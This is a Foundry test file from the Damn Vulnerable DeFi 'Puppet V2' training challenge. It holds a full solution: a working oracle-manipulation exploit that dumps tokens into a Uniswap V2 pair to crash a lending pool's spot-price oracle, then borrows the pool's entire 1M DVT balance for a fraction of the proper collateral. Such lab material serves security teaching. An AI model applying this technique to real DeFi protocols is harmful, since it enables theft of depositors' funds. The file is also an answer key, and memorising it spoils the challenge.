// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";

contract PuppetV2Challenge is Test {

    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE  = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE  = 10_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE    = 20e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE    = 1_000_000e18;

    WETH                 weth;
    DamnValuableToken    token;
    IUniswapV2Factory    uniswapV2Factory;
    IUniswapV2Router02   uniswapV2Router;
    IUniswapV2Pair       uniswapV2Exchange;
    PuppetV2Pool         lendingPool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        weth  = new WETH();
        token = new DamnValuableToken();

        uniswapV2Factory = IUniswapV2Factory(
            deployCode("builds/uniswap/UniswapV2Factory.json", abi.encode(address(0)))
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode("builds/uniswap/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth)))
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token),
            UNISWAP_INITIAL_TOKEN_RESERVE,
            0, 0,
            deployer,
            block.timestamp * 2
        );
        uniswapV2Exchange = IUniswapV2Pair(uniswapV2Factory.getPair(address(token), address(weth)));

        lendingPool = new PuppetV2Pool(address(weth), address(token), address(uniswapV2Exchange), address(uniswapV2Factory));

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(address(lendingPool)), POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * =========================================================
     * SOLUTION — test_puppetV2()
     * =========================================================
     * Attack: Uniswap V2 spot price oracle manipulation
     *
     * PuppetV2Pool._getOracleQuote() calls UniswapV2Library.quote()
     * which returns amountA * reserveB / reserveA — a raw reserve
     * ratio with zero manipulation resistance.
     *
     * No helper contract needed — all steps run inline.
     * No nonce constraint in this challenge.
     *
     * 1. Swap all 10,000 DVT → ETH via UniV2 router
     *    → reserves: 100 DVT/10 WETH → ~10,100 DVT/~0.099 WETH
     *    → oracle price crashes ~10,000x
     * 2. Wrap all ETH to WETH (pool requires WETH collateral via transferFrom)
     * 3. calculateDepositOfWETHRequired(1M DVT) now returns ~29.4 WETH
     *    (was 300,000 WETH) — within player's ~29.9 WETH balance
     * 4. borrow(1M DVT) pulls ~29.4 WETH collateral, sends 1M DVT to player
     * 5. Transfer 1M DVT to recovery
     * =========================================================
     */
    function test_puppetV2() public checkSolvedByPlayer {
        // Step 1: Dump all DVT → ETH to crash the UniV2 oracle price
        // UniswapV2Library.quote() reads live reserves — moves instantly with swap
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);

        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV2Router.swapExactTokensForETH(
            PLAYER_INITIAL_TOKEN_BALANCE,
            0,                    // min ETH out — accept any amount
            path,
            player,
            block.timestamp * 2
        );

        // Step 2: Wrap all ETH to WETH
        // Pool's borrow() uses transferFrom — requires ERC20 WETH, not native ETH
        weth.deposit{value: player.balance}();

        // Step 3: Approve pool to pull WETH collateral
        // After dump: calculateDepositOfWETHRequired(1M DVT) ≈ 29.4 WETH
        uint256 wethNeeded = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), wethNeeded);

        // Step 4: Borrow all 1M DVT at the deflated collateral rate
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        // Step 5: Forward recovered DVT to recovery address
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
